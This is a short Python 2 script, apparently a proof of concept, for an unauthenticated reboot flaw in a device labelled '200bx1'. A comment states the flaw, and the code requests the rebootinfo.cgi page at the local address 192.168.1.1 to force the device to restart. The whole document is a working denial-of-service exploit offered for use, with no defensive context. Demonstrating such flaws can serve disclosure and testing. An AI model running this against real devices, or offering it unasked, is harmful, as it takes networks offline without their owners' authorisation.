import urllib2

#flaw in 200bx1 - can reboot without authentication

stat_url="http://192.168.1.1/rebootinfo.cgi"
raw_input("Press Enter to Reboot")
urllib2.urlopen(stat_url)
